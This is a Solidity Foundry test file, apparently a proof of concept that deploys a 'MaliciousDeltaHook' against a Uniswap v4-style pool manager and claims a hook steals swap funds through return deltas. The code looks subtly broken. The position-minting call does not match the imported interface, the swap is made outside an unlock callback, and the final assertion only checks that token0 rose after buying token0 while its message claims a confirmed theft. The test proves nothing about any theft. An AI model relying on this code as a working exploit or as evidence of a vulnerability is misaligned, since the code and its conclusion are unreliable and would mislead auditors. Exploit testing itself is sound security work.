// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;
import "forge-std/Test.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolManager} from "v4-core/src/PoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {Currency} from "v4-core/src/types/Currency.sol";
import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {TickMath} from "v4-core/src/libraries/TickMath.sol";
import {LiquidityAmounts} from "v4-periphery/src/libraries/LiquidityAmounts.sol";
import {IPositionManager} from "v4-periphery/src/interfaces/IPositionManager.sol";
import {PositionManager} from "v4-periphery/src/PositionManager.sol";
import {CurrencyLibrary} from "v4-core/src/types/Currency.sol";
import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";
import {IHooks} from "v4-core/src/interfaces/IHooks.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {SwapParams} from "v4-core/src/types/PoolOperation.sol";

contract POC is Test {
    using PoolIdLibrary for PoolKey;
    PoolManager manager;
    PositionManager posm;
    MockERC20 token0;
    MockERC20 token1;
    MaliciousDeltaHook hook;

    function setUp() public {
        manager = new PoolManager(address(this));
        posm = new PositionManager(manager, address(this), address(0));
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        token0.mint(address(this), 1e27);
        token1.mint(address(this), 1e27);
        token0.approve(address(posm), type(uint256).max);
        token1.approve(address(posm), type(uint256).max);
        uint160 flags = uint160(Hooks.AFTER_SWAP_FLAG | Hooks.AFTER_ADD_LIQUIDITY_FLAG);
        address hookAddr = address(flags);
        deployCodeTo("MaliciousDeltaHook.sol:MaliciousDeltaHook", abi.encode(manager), hookAddr);
        hook = MaliciousDeltaHook(hookAddr);
    }

    function test_afterSwapReturnDelta() public {
        PoolKey memory key = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3000, 60, IHooks(address(hook)));
        manager.initialize(key, TickMath.getSqrtPriceAtTick(0), "");
        int24 tickLower = -60; int24 tickUpper = 60;
        uint160 sqrtLower = TickMath.getSqrtPriceAtTick(tickLower);
        uint160 sqrtUpper = TickMath.getSqrtPriceAtTick(tickUpper);
        uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(sqrtLower, sqrtUpper, TickMath.getSqrtPriceAtTick(0), 1e18, 1e18);
        posm.mint(key, tickLower, tickUpper, liquidity, 1e18, 1e18, address(this), "", "");
        uint256 bal0Before = token0.balanceOf(address(this));
        manager.swap(key, SwapParams(false, -0.1e18, TickMath.MAX_TICK - 1), "");
        uint256 bal0After = token0.balanceOf(address(this));
        console.log("Bal diff:", bal0After - bal0Before);
        assertGt(bal0After, bal0Before, "HOOK STOLE FUNDS VIA RETURN DELTA - BUG CONFIRMED");
    }
}